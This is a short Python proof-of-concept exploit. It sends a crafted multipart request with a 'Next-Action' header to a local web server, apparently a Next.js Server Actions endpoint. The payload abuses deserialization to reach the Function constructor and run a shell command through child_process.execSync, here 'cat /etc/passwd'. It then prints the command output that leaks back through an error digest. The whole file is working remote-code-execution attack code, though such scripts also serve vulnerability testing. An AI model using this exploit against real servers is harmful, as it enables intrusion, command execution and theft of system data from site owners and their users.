import requests
import json

URL = "http://127.0.0.1:3000"
COMMAND = "cat /etc/passwd"

res = requests.post(
    URL,
    files={
        "0": (
            None,
            json.dumps(
                {
                    "status": "resolved_model",
                    "reason": 0,
                    "_response": {
                        "_prefix": f"""var res = process.mainModule.require('child_process').execSync('{COMMAND}'); throw Object.assign(new Error(), {{digest:`${{res}}`}});""",
                        "_formData": {
                            "get": "$1:then:constructor",
                        },
                    },
                    "then": "$1:then",
                    "value": '{"then":"$B"}',
                }
            ),
        ),
        "1": (None, '"$@0"'),
    },
    headers={"Next-Action": "x"},
)

if "1:E" in res.text and (
    leak := json.loads(res.text.split("1:E")[1].strip())["digest"]
):
    print(leak)
else:
    print("Exploit failed.")
